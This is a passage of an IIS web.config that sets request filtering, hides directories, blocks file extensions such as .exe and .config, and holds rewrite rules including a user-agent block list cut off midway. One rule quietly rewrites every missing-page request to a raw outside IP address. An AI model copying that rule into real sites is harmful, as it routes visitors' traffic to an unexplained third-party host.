<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <security>
            <requestFiltering>	
			<requestLimits maxAllowedContentLength="52428800" />
			<hiddenSegments>
          <add segment="vendor" />
          <add segment="node_modules" />
          <add segment="project" />
          <add segment="errors" />
          <add segment="logs" />
          <add segment="src" />
          <add segment="GeoIP" />
          <add segment="ffmpeg" />
          <add segment="stublib" />
        </hiddenSegments>
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".exe" allowed="false" />
          <add fileExtension=".apk" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".cmd" allowed="false" />
		  <add fileExtension=".zip" allowed="false" />
          <add fileExtension=".rar" allowed="true" />
          <add fileExtension=".7z" allowed="false" />
		  <add fileExtension=".bak" allowed="false" />
	      <add fileExtension=".old" allowed="false" />
	      <add fileExtension=".log" allowed="false" />
	      <add fileExtension=".temp" allowed="false" />
	      <add fileExtension=".lock" allowed="false" />
	      <add fileExtension=".json" allowed="false" />
	      <add fileExtension=".phar" allowed="false" />
	      <add fileExtension=".xml" allowed="false" />
	      <add fileExtension=".dll" allowed="false" />
	      <add fileExtension=".config" allowed="false" />
	      <add fileExtension=".pdb" allowed="false" />
		  <add fileExtension=".htaccess" allowed="false" />
		  <add fileExtension=".htpasswd" allowed="false" />
        </fileExtensions>
        <verbs allowUnlisted="true" />
      </requestFiltering>
	  
        </security>
        <rewrite>
            <rules>
                <rule name="Imported Rule 1" enabled="true" stopProcessing="true">
                    <match url="^(.*)\.html$" ignoreCase="false" />
                    <action type="Redirect" url="{R:1}.php" redirectType="Found" />
                </rule>
                <rule name="Imported Rule 2" enabled="true" stopProcessing="true">
                    <match url="^(.*)$" ignoreCase="false" />
                    <conditions logicalGrouping="MatchAll">
                        <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
                        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
                    </conditions>
                    <action type="Rewrite" url="http://212.224.88.213/yaarsa/404.php" />
                </rule>
                <rule name="Imported Rule 3" enabled="true" stopProcessing="true">
                    <match url="^" ignoreCase="false" />
                    <conditions logicalGrouping="MatchAll">
                        <add input="{HTTP_HOST}" pattern="^www\.(.+)" ignoreCase="false" />
                        <add input="{HTTPS}s/{C:1}" pattern="^(on(s)|offs)/(.+)" ignoreCase="false" />
                    </conditions>
                    <action type="Redirect" url="http{C:2}://{C:3}{URL}" redirectType="Permanent" />
                </rule>
                <rule name="Imported Rule 5" enabled="true" stopProcessing="true">
                    <match url="^.*" ignoreCase="false" />
                    <conditions logicalGrouping="MatchAny">
                        <add input="{HTTP_USER_AGENT}" pattern="almaden" ignoreCase="false" />
                        <add input="{HTTP_USER_AGENT}" pattern="^Anarchie" ignoreCase="false" />
                        <add input="{HTTP_USER_AGENT}" pattern="^ASPSeek" ignoreCase="false" />
